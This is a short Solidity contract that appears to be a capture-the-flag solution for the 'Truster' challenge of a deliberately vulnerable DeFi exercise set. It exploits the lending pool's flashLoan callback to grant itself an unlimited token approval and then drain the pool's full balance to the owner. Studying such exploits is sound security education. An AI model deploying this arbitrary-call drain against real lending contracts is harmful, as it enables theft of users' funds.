// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterAttack {
	IERC20 immutable dvt;
	TrusterLenderPool immutable pool;
	address immutable owner;

	constructor(address _dvtAddress, address _poolAddr) {
		dvt = IERC20(_dvtAddress);
		pool = TrusterLenderPool(_poolAddr);
		owner = msg.sender;
	}

	function drain() external {
		require(msg.sender == owner);

		// Encode the approve() function of DVT contract with our
		// desired parameters and store it as "data", to pass this as
		// parameter in pool's flashLoan() function call.
		bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), 2**256 - 1);

		// Execute flashLoan() function on the pool contract.
		// This does an approval from the pool to this contract.
		pool.flashLoan(0, owner, address(dvt), data);

		// Transfer all tokens from pool to attacker
		dvt.transferFrom(address(pool), owner, dvt.balanceOf(address(pool)));
	}
}
